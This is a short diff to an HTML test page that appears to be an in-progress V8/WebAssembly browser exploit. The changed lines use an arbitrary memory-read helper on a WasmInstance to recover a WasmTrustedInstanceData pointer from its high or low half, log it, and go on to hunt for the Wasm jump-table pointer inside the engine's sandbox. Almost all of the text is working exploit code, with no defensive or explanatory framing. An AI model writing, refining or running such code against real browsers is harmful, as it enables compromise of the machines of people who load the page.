@@ -1,4 +1,4 @@
-<!doctype html><html><head><meta charset="utf-8"><title>P64</title></head>
+<!doctype html><html><head><meta charset="utf-8"><title>P64b</title></head>
 <body><pre id="out">Running...</pre>
 <script>
 "use strict";
@@ -50,8 +50,8 @@ if(Array.isArray(m)){
     // Read WasmInstance QWORD 2 to get SandboxedPointer (WasmTrustedInstanceData ptrs)
     const wR=wA&0xFFFFFFFE;
     const wi2=hr(wR+16); // QWORD 2 of WasmInstance
-    const ptr1=Number(wi2&0xffffffffn)&0xFFFFFFFE;
-    log("WTID:"+ptr1.toString(16));
+    const lo=Number(wi2&0xffffffffn)&0xFFFFFFFE;const hi=Number(wi2>>32n)&0xFFFFFFFE;const ptr1=(lo>0x1000000&&(lo&1)===0)?lo:hi;
+    log("WTID:"+ptr1.toString(16)+" lo:"+lo.toString(16)+" hi:"+hi.toString(16));
     // Read WasmTrustedInstanceData fields
     if(ptr1>0x1000000){
       // Look for SandboxedPointer (jump_table_start) — typically at offset ~40-80 in WTID
